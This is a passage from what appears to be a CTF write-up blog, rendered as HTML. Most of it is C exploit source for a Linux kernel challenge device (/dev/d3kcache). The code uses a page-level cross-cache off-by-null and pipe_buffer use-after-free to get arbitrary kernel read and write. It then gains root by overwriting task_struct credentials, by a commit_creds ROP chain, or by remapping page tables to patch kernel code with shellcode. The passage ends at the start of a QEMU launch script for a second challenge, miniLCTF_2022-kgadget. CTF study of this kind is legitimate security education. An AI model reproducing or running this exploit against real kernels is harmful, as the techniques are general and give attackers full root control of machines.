class="number">377</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">    tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>),</span><br><span class="line">                            &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_OFFSET 12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_OFFSET 21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_OFFSET 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_OFFSET 39</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_ENTRY_MASK 0b111111111UL</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_MASK (PT_ENTRY_MASK &lt;&lt; PTE_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_MASK (PT_ENTRY_MASK &lt;&lt; PMD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_MASK (PT_ENTRY_MASK &lt;&lt; PUD_OFFSET)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_MASK (PT_ENTRY_MASK &lt;&lt; PGD_OFFSET)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_ENTRY(addr) ((addr &gt;&gt; PTE_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PMD_ENTRY(addr) ((addr &gt;&gt; PMD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUD_ENTRY(addr) ((addr &gt;&gt; PUD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGD_ENTRY(addr) ((addr &gt;&gt; PGD_OFFSET) &amp; PT_ENTRY_MASK)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_RW (1UL &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_ATTR_NX (1UL &lt;&lt; 63)</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> pgd_addr, mm_struct_addr, *mm_struct_buf;</span><br><span class="line"><span class="type">size_t</span> stack_addr, stack_addr_another;</span><br><span class="line"><span class="type">size_t</span> stack_page, mm_struct_page;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr, pte_val;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    pte_val = (buf[PTE_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pte_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">vaddr_resolve_for_3_level</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    <span class="keyword">return</span> (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vaddr_remapping</span><span class="params">(<span class="type">size_t</span> pgd_addr, <span class="type">size_t</span> vaddr, <span class="type">size_t</span> paddr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="type">size_t</span> pud_addr, pmd_addr, pte_addr;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pgd_addr), buf);</span><br><span class="line">    pud_addr = (buf[PGD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pud_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pud_addr), buf);</span><br><span class="line">    pmd_addr = (buf[PUD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pmd_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pmd_addr), buf);</span><br><span class="line">    pte_addr = (buf[PMD_ENTRY(vaddr)] &amp; (~<span class="number">0xfff</span>)) &amp; (~PAGE_ATTR_NX);</span><br><span class="line">    pte_addr += page_offset_base;</span><br><span class="line"></span><br><span class="line">    arbitrary_read_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf);</span><br><span class="line">    buf[PTE_ENTRY(vaddr)] = paddr | <span class="number">0x8000000000000867</span>; <span class="comment">/* mark it writable */</span></span><br><span class="line">    arbitrary_write_by_pipe((<span class="type">void</span>*) direct_map_addr_to_page_addr(pte_addr), buf,</span><br><span class="line">                            <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">pgd_vaddr_resolve</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading current task_struct...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read current task_struct */</span></span><br><span class="line">    current_task_page = direct_map_addr_to_page_addr(current_task);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) current_task_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (current_task_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">    stack_addr = tsk_buf[<span class="number">4</span>];</span><br><span class="line">    mm_struct_addr = tsk_buf[<span class="number">292</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] kernel stack&#x27;s addr:\033[0m0x%lx\n&quot;</span>,stack_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s addr:\033[0m0x%lx\n&quot;</span>,mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    mm_struct_page = direct_map_addr_to_page_addr(mm_struct_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] mm_struct&#x27;s page:\033[0m0x%lx\n&quot;</span>,mm_struct_page);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* read mm_struct */</span></span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) mm_struct_page, buf);</span><br><span class="line">    arbitrary_read_by_pipe((<span class="keyword">struct</span> page*) (mm_struct_page+<span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    mm_struct_buf = (<span class="type">size_t</span>*) ((<span class="type">size_t</span>) buf + (mm_struct_addr &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* only this is a virtual addr, others in page table are all physical addr*/</span></span><br><span class="line">    pgd_addr = mm_struct_buf[<span class="number">9</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got kernel page table of current task:\033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, pgd_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * It may also be okay to write ROP chain on pipe_write&#x27;s stack, if there&#x27;s</span></span><br><span class="line"><span class="comment"> * no CONFIG_RANDOMIZE_KSTACK_OFFSET_DEFAULT(it can also be bypass by RETs). </span></span><br><span class="line"><span class="comment"> * But what I want is a more novel and general exploitation that </span></span><br><span class="line"><span class="comment"> * doesn&#x27;t need any information about the kernel image. </span></span><br><span class="line"><span class="comment"> * So just simply overwrite the task_struct is good :)</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * If you still want a normal ROP, refer to following codes.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INIT_CRED 0xffffffff83079ee8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RET 0xffffffff810157aa</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_rop</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>], idx = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* reading the page table directly to get physical addr of kernel stack*/</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Reading page table...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);</span><br><span class="line">    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="comment">/* N/X bit */</span></span><br><span class="line">    stack_addr_another += page_offset_base;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* construct the ROP */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ((<span class="number">0x1000</span> - <span class="number">0x100</span>) / <span class="number">8</span>); i++) &#123;</span><br><span class="line">        rop[idx++] = RET + kernel_offset;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    rop[idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    rop[idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    rop[idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="number">54</span> + kernel_offset;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) get_root_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    stack_page = direct_map_addr_to_page_addr(stack_addr_another);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    arbitrary_write_by_pipe((<span class="keyword">struct</span> page*) (stack_page + <span class="number">0x40</span> * <span class="number">3</span>), rop, <span class="number">0xff0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">privilege_escalation_by_usma</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *kcode_map, *kcode_func;</span><br><span class="line">    <span class="type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* resolving some vaddr */</span></span><br><span class="line">    pgd_vaddr_resolve();</span><br><span class="line"></span><br><span class="line">    kcode_map = mmap((<span class="type">void</span>*) <span class="number">0x114514000</span>, <span class="number">0x2000</span>, PROT_READ | PROT_WRITE, </span><br><span class="line">                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (!kcode_map) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to create mmap area!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* because of lazy allocation, we need to write it manually */</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">        kcode_map[i] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">        kcode_map[i + <span class="number">0x1000</span>] = <span class="string">&quot;arttnba3&quot;</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code seg to exec shellcode directly :) */</span></span><br><span class="line">    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,</span><br><span class="line">           dst_vaddr);</span><br><span class="line"></span><br><span class="line">    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);</span><br><span class="line">    dst_paddr += <span class="number">0x1000</span> * PTE_ENTRY(dst_vaddr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span></span><br><span class="line">           <span class="string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* remapping to our mmap area */</span></span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span>, dst_paddr);</span><br><span class="line">    vaddr_remapping(pgd_addr, <span class="number">0x114514000</span> + <span class="number">0x1000</span>, dst_paddr + <span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* overwrite kernel code segment directly */</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span></span><br><span class="line"><span class="comment">     * so we can just patch it to let it always return true :)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>), <span class="string">&#x27;\x90&#x27;</span>, <span class="number">0x40</span>); <span class="comment">/* nop */</span></span><br><span class="line">    <span class="built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="number">0xfff</span>) + <span class="number">0x40</span>, </span><br><span class="line">            <span class="string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="comment">/* endbr64 */</span></span><br><span class="line">            <span class="string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="comment">/* mov rax, 1 */</span></span><br><span class="line">            <span class="string">&quot;\xc3&quot;</span>, <span class="comment">/* ret */</span></span><br><span class="line">            <span class="number">12</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* get root now :) */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    setresuid(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    get_root_shell();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Just for testing CFI&#x27;s availability :)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">trigger_control_flow_integrity_detection</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pbuf</span> =</span> (<span class="type">void</span>*) ((<span class="type">size_t</span>)buf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>, *<span class="title">ops_addr</span>;</span></span><br><span class="line"></span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*) </span><br><span class="line">                 (((<span class="type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="number">0x40</span> * <span class="number">0x1000</span>);</span><br><span class="line">    ops_addr = (<span class="keyword">struct</span> pipe_buf_operations*)((<span class="type">size_t</span>)ops_addr+page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* two random gadget :) */</span></span><br><span class="line">    ops = (<span class="keyword">struct</span> pipe_buf_operations*) buf;</span><br><span class="line">    ops-&gt;confirm = (<span class="type">void</span>*)(<span class="number">0xffffffff81a78568</span> + kernel_offset);</span><br><span class="line">    ops-&gt;release = (<span class="type">void</span>*)(<span class="number">0xffffffff816196e6</span> + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        pbuf-&gt;ops = ops_addr;</span><br><span class="line">        pbuf = (<span class="keyword">struct</span> pipe_buffer *)((<span class="type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    evil_2nd_buf.page = info_pipe_buf.page;</span><br><span class="line">    evil_2nd_buf.offset = <span class="number">0</span>;</span><br><span class="line">    evil_2nd_buf.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 4th pipe pointing to 2nd pipe */</span></span><br><span class="line">    write(pipe_fd[self_3rd_pipe_pid][<span class="number">1</span>],&amp;evil_4th_buf,<span class="keyword">sizeof</span>(evil_4th_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_2nd_buf,<span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>], </span><br><span class="line">          temp_zero_buf, </span><br><span class="line">          TRD_PIPE_BUF_SZ - <span class="keyword">sizeof</span>(evil_2nd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* hijack the 3rd pipe to point to 4th pipe */</span></span><br><span class="line">    write(pipe_fd[self_4th_pipe_pid][<span class="number">1</span>],&amp;evil_3rd_buf,<span class="keyword">sizeof</span>(evil_3rd_buf));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* write data into dst page */</span></span><br><span class="line">    write(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>], buf, <span class="number">0xf00</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* trigger CFI... */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[self_2nd_pipe_pid][<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.O - fundamental works</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* bind core to 0 */</span></span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* dev file */</span></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* spray pgv pages */</span></span><br><span class="line">    prepare_pgv_system();</span><br><span class="line">    prepare_pgv_pages();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span></span><br><span class="line"><span class="comment">     * making two pipe_buffer pointing to the same pages</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_first_level_pipe_for_page_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * leak page-related address and construct a second-level pipe uaf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    corrupting_second_level_pipe_for_pipe_uaf();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span></span><br><span class="line"><span class="comment">     * construct three self-page-pointing pipe_buffer </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    building_self_writing_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.IV - leaking fundamental information by pipe</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    info_leaking_by_arbitrary_pipe();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Step.V - different method of exploitation</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;rop&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* traditionally root by rop */</span></span><br><span class="line">        privilege_escalation_by_rop();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;cfi&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">/* extra - check for CFI&#x27;s availability */</span></span><br><span class="line">        trigger_control_flow_integrity_detection();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (argv[<span class="number">1</span>] &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;usma&quot;</span>)) &#123;</span><br><span class="line">        privilege_escalation_by_usma();</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* default: root by seeking init_task and overwrite current */</span></span><br><span class="line">        privilege_escalation_by_task_overwrite();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* we SHOULDN&#x27;T get there, so panic :( */</span></span><br><span class="line">    trigger_control_flow_integrity_detection();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="miniLCTF-2022-kgadget"><a href="#miniLCTF-2022-kgadget" class="headerlink" title="miniLCTF_2022-kgadget"></a>miniLCTF_2022-kgadget</h1><p>启动脚本</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-initrd ./rootfs.cpio.gz \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor 